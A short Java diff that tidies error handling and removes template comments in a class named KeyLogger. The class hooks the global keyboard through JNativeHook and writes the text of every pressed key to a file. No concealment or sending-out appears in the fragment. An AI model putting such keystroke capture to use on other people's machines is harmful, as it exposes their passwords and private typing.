@@ -24,7 +24,7 @@ public class KeyLogger implements NativeKeyListener {
             Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
             logger.setLevel(Level.OFF);
         } catch (NativeHookException e) {
-            e.printStackTrace();
+            System.out.println("Error: " + e.getMessage());
         }
 
         GlobalScreen.addNativeKeyListener(this);
@@ -36,28 +36,19 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent key) {
-        // throw new UnsupportedOperationException("Not supported yet.");r //To change
-        // body of generated methods, choose Tools | Templates.
-
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent key) {
-        // throw new UnsupportedOperationException("Not supported yet."); //To change
-        // body of generated methods, choose Tools | Templates.
         CharSequence text = NativeKeyEvent.getKeyText(key.getKeyCode()) + "\n";
         try {
             kf.keyLoggerWriter(text);
         } catch (IOException e) {
-            e.printStackTrace();
+            System.out.println("Error: " + e.getMessage());
         }
-//        System.out.println("KEY : "+text);
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent key) {
-        // throw new UnsupportedOperationException("Not supported yet."); //To change
-        // body of generated methods, choose Tools | Templates.
-        // System.out.println("Released : " + NativeKeyEvent.getKeyText(key.getKeyCode()));
     }
 }
